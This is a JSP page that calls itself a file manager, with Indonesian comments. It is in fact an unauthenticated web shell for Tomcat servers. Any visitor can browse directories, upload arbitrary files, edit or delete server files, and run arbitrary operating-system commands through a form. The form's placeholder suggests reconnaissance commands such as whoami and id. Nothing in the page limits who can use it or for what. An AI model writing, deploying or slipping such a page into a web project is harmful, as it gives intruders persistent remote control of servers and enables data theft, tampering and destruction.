<%@ page import="java.io.*, java.net.*, java.util.*, java.text.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>JSP File Manager - With Edit</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        input, button, textarea { background: #0d7377; color: white; border: none; padding: 8px; margin: 2px; }
        a { color: #00adb5; text-decoration: none; }
        .file { color: #4ecdc4; }
        .dir { color: #ffe66d; font-weight: bold; }
        hr { border-color: #323232; }
        .upload-area { border: 2px dashed #0d7377; padding: 20px; margin: 20px 0; }
        .edit-area { border: 2px solid #0d7377; padding: 20px; margin: 20px 0; background: #2d2d2d; }
        textarea { width: 100%; background: #1e1e1e; color: #d4d4d4; font-family: monospace; }
    </style>
</head>
<body>
<h1>📁 JSP File Manager - With Edit & Upload</h1>
<hr/>

<%
    String currentPath = request.getParameter("path");
    String action = request.getParameter("action");
    String newPath = request.getParameter("newpath");
    String filename = request.getParameter("filename");
    String editContent = request.getParameter("editContent");
    String saveFile = request.getParameter("saveFile");
    
    // Default path (Tomcat webapps)
    if (currentPath == null || currentPath.isEmpty()) {
        currentPath = "/opt/tomcat/webapps/";
    }
    
    // ========== NAVIGASI PINDAH PATH ==========
    if (action != null && action.equals("cd") && newPath != null) {
        File newDir = new File(newPath);
        if (newDir.exists() && newDir.isDirectory()) {
            currentPath = newPath;
        } else {
            out.println("<p style='color:#ff6b6b'>❌ Path tidak valid: " + newPath + "</p>");
        }
    }
    
    // ========== UPLOAD FILE (Java 7 Compatible) ==========
    if (action != null && action.equals("upload")) {
        try {
            Part filePart = request.getPart("file");
            String fileName = getFileName(filePart);
            String uploadPath = currentPath + File.separator + fileName;
            filePart.write(uploadPath);
            out.println("<p style='color:#4ecdc4'>✅ Upload sukses: " + uploadPath + "</p>");
        } catch (Exception e) {
            out.println("<p style='color:#ff6b6b'>❌ Upload gagal: " + e.getMessage() + "</p>");
        }
    }
    
    // ========== SAVE EDITED FILE ==========
    if (saveFile != null && saveFile.equals("1") && filename != null && editContent != null) {
        try {
            String filePath = currentPath + File.separator + filename;
            FileWriter fw = new FileWriter(filePath);
            fw.write(editContent);
            fw.close();
            out.println("<p style='color:#4ecdc4'>✅ File saved successfully: " + filename + "</p>");
        } catch (Exception e) {
            out.println("<p style='color:#ff6b6b'>❌ Save failed: " + e.getMessage() + "</p>");
        }
    }
    
    // ========== DELETE FILE ==========
    if (action != null && action.equals("delete") && filename != null) {
        File delFile = new File(currentPath + File.separator + filename);
        if (delFile.delete()) {
            out.println("<p style='color:#4ecdc4'>✅ Dihapus: " + filename + "</p>");
        } else {
            out.println("<p style='color:#ff6b6b'>❌ Gagal hapus: " + filename + "</p>");
        }
    }
    
    // ========== BACA FILE (View) ==========
    if (action != null && action.equals("view") && filename != null) {
        File viewFile = new File(currentPath + File.separator + filename);
        if (viewFile.exists() && viewFile.isFile()) {
            out.println("<h3>📄 Isi File: " + filename + "</h3>");
            out.println("<div class='edit-area'>");
            out.println("<form method='post'>");
            out.println("<input type='hidden' name='action' value='edit'>");
            out.println("<input type='hidden' name='filename' value='" + filename + "'>");
            out.println("<input type='hidden' name='path' value='" + currentPath + "'>");
            out.println("<textarea name='editContent' rows='20' cols='100'>");
            BufferedReader br = new BufferedReader(new FileReader(viewFile));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            br.close();
            out.println("</textarea><br/>");
            out.println("<button type='submit'>💾 Save Changes</button>");
            out.println("</form>");
            out.println("</div>");
        }
    }
    
    // ========== EKSEKUSI COMMAND ==========
    if (action != null && action.equals("exec") && filename != null) {
        try {
            Process p = Runtime.getRuntime().exec(filename);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            out.println("<h3>💻 Output Command: " + filename + "</h3>");
            out.println("<pre style='background:#2d2d2d; padding:10px; overflow:auto; max-height:400px;'>");
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            reader.close();
            out.println("</pre>");
        } catch (Exception e) {
            out.println("<p style='color:#ff6b6b'>❌ Error: " + e.getMessage() + "</p>");
        }
    }
%>

<!-- ========== FORM PINDAH PATH ========== -->
<h3>📂 Current Directory:</h3>
<form method="get">
    <input type="hidden" name="action" value="cd">
    <input type="text" name="newpath" value="<%= currentPath %>" size="60">
    <button type="submit">Go / Pindah</button>
</form>
<p><strong>Path aktif:</strong> <code><%= currentPath %></code></p>

<!-- ========== FORM UPLOAD FILE ========== -->
<div class="upload-area">
    <h3>📤 Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="upload">
        <input type="hidden" name="path" value="<%= currentPath %>">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
</div>

<%
    // ========== LIST FILE DAN DIREKTORI (TANPA LAMBDA) ==========
    File dir = new File(currentPath);
    File[] files = dir.listFiles();
    List<File> fileList = new ArrayList<File>();
    
    if (files != null) {
        // Convert array to list
        for (File f : files) {
            fileList.add(f);
        }
        
        // Sort manually (directory first, then alphabetically)
        Collections.sort(fileList, new Comparator<File>() {
            public int compare(File f1, File f2) {
                if (f1.isDirectory() && !f2.isDirectory()) return -1;
                if (!f1.isDirectory() && f2.isDirectory()) return 1;
                return f1.getName().compareToIgnoreCase(f2.getName());
            }
        });
%>

<h3>📋 Daftar File & Direktori:</h3>
<table border="0" cellpadding="5" style="width:100%; border-collapse: collapse;">
    <tr style="background:#0d7377;">
        <th style="text-align:left;">📁 Nama</th>
        <th style="text-align:left;">📏 Size</th>
        <th style="text-align:left;">🕒 Modified</th>
        <th style="text-align:center;">⚡ Actions</th>
    </tr>
    <tr style="background:#2d2d2d;">
        <td colspan="4"><a href="?action=cd&newpath=<%= new File(currentPath).getParent() %>" class="dir">🔙 .. (Parent Directory)</a></td>
    </tr>

<%
        for (File f : fileList) {
            String fname = f.getName();
            boolean isDir = f.isDirectory();
            long size = isDir ? 0 : f.length();
            long modified = f.lastModified();
            String sizeStr = isDir ? "<DIR>" : (size / 1024) + " KB";
            Date modifiedDate = new Date(modified);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            
            // Check if file is editable (text files)
            boolean isEditable = !isDir && (fname.endsWith(".jsp") || fname.endsWith(".properties") || 
                                           fname.endsWith(".xml") || fname.endsWith(".txt") || 
                                           fname.endsWith(".html") || fname.endsWith(".css") ||
                                           fname.endsWith(".js") || fname.endsWith(".sql") ||
                                           fname.endsWith(".java") || fname.endsWith(".conf"));
%>
    <tr style="border-bottom:1px solid #323232;">
        <td>
            <% if (isDir) { %>
                <a href="?action=cd&newpath=<%= f.getAbsolutePath() %>" class="dir">📁 <%= fname %></a>
            <% } else { %>
                <span class="file">📄 <%= fname %></span>
            <% } %>
        </td>
        <td><%= sizeStr %></td>
        <td><%= sdf.format(modifiedDate) %></td>
        <td style="text-align:center;">
            <% if (!isDir) { %>
                <a href="?action=view&filename=<%= fname %>&path=<%= currentPath %>">👁️ View/Edit</a> |
                <a href="?action=delete&filename=<%= fname %>&path=<%= currentPath %>" onclick="return confirm('Yakin hapus?')">🗑️ Delete</a>
            <% } %>
        </td>
    </tr>
<%
        }
    } else {
        out.println("<p style='color:#ff6b6b'>❌ Cannot read directory or no permission.</p>");
    }
%>
</table>

<hr/>

<!-- ========== COMMAND EXECUTOR ========== -->
<h3>💻 Execute Command</h3>
<form method="get">
    <input type="hidden" name="action" value="exec">
    <input type="hidden" name="path" value="<%= currentPath %>">
    <input type="text" name="filename" placeholder="Contoh: id, whoami, ls -la, pwd" size="60">
    <button type="submit">Run</button>
</form>

</body>
</html>

<%!
    // Helper function to get filename from Part (Java 7 compatible)
    private String getFileName(Part part) {
        String contentDisposition = part.getHeader("content-disposition");
        String[] elements = contentDisposition.split(";");
        for (String element : elements) {
            if (element.trim().startsWith("filename")) {
                return element.substring(element.indexOf('=') + 1).trim().replace("\"", "");
            }
        }
        return null;
    }
%>
